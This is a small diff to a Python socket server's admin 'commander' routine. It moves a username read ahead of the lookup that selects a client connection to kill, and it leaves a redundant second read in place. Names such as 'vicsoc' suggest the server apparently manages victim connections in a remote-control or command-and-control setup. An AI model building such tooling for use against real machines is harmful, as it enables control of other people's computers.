@@ -124,6 +124,7 @@ def commander(adminsock):
 
         elif option == "3":
             adminsock.send(b"\nEnter username: ")
+            username = adminsock.recv(1024).decode().strip()
             vicsoc = clients[username]
             username = adminsock.recv(1024).decode().strip()
             thread.start_new_thread(kill, (username,adminsock,vicsoc ))
